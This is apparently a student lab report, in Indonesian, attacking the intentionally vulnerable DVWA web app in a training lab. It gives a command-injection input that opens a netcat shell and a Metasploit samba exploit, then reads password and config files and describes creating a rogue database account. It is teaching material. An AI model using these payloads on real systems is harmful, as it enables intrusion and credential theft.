##### TUGAS 3 PKSJ
# Damn Vulnerable Web App (DVWA) Menggunakan Metasploit dengan Command Execution
## Pendahuluan
Damn Vulnerable Web App (DVWA) adalah PHP/MySQL web application yang sangat rentan terhadap serangan.
Tujuan utama penggunaan DVWA adalah sebagai alat bantu untuk menguji tools dan kemampuan bagi web developer. Khususnya, digunakan untuk  lebih memahami proses pengamanan aplikasi web
Dalam simulasi ini, yang akan kami lakukan adalah
- Menguji Command Execution dimana Security telah disetting levelnya menjadi sangat rendah
- Memulai Metasploit di Backtrack dan terhubung ke sesi Netcat yang dibuat di dalam DVWA.
- Menggunakan nama pengguna apache untuk mencari kelemahan sistem yang potensial
- Menemukan file php yang dilindungi dengan lemah yang berisi database credentials
- Menggunakan database credentials tersebt untuk mengambil alih database


###### Anggota Kelompok :
| Nama        | NRP         |
|:-------------:|:-----:|
M Rasyid Karomi  |  5114100101
Miftakhul Akhyar |  5114100143
Faiq Firdausi    |  5114100165

## Proses Simulasi
### Cek IP Metasploit Linux
Ketikan perintah untuk mencari alamat IP
```
ifconfig eth1
```
[//]: <> gambar 1

### Membuka DVWA
Buka DVWA dengan mengetikkan alamat IP pada browser
[//]: <> gambar 2
[//]: <> gambar 3

### Set Security DVWA menjadi low
Pilih menu DVWA Security, kemudian set Security dari high menjadi low
[//]: <> gambar 4
[//]: <> gambar 5

### Command Execution
Pilih menu Command Execution, kemudian coba lakukan ping server metasploit dengan memasukkan alamat IP
[//]: <> gbr 6

Masukkan command sebagai berikut, maka halaman akan loading
```
192.168.1.106;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```
[//]: <> gbr 7

### Memulai Metasploit
Ketikkan perintah ke terminal sebagai berikut
```
use exploit.multi. samba. usermap_script
```
[//]: <> gbr 8
Kemudian untuk membuka opsi, ketikkan perintah ke terminal sebagai berikut 
```
show options
```
[//]: <> gbr 9
Set RHOST alamat IP kemudian exploit
```
set RHOST 192.168.1.21
```
[//]: <> gbr 10
[//]: <> gbr 11

### Mencari Database Credentials
Pastikan user adalah root dengan memberi perintah whoami pada terminal
[//]: <> gbr 12
Ketikkan perintah grep pada terminal
```
grep root /etc/passwd
grep root /etc/group
```
[//]: <> gbr 13
Explore directory credentials
[//]: <> gbr 14
Lihat permission dari file config terlihat bahwa permisson rw-r-r (644) maka file dapat dibuka
[//]: <> gbr 15
Ketikkan perintah cat pada file config maka dapat melihat password dvwa
```
cat /var/www/dvwa/config/config.inc.php
```
[//]: <> gbr 16
Gunakan perintah show databases tanpa -p karena password null
[//]: <> gbr 17

### Mengambil alih Database
Masuk pada database dvwa dan gunakan perintah show tables lalu gunakan perintah select all from users
[//]: <> gbr 18
Insert data faiq firdausy sebagai user lalu select table dvwa users
[//]: <> gbr 19
Masuk pada database mysql
[//]: <> gbr 20
Buat akun user baru dengan nama db_hacker dan password faiq
[//]: <> gbr 21
Select semua data di tabel user database mysql maka ada user db_hacker
[//]: <> gbr 22
Buka terminal baru masuk melalui user database baru db_hacker password faiq
[//]: <> gbr 23
Gunakan perintah show databases untuk melihat semua database
[//]: <> gbr 24



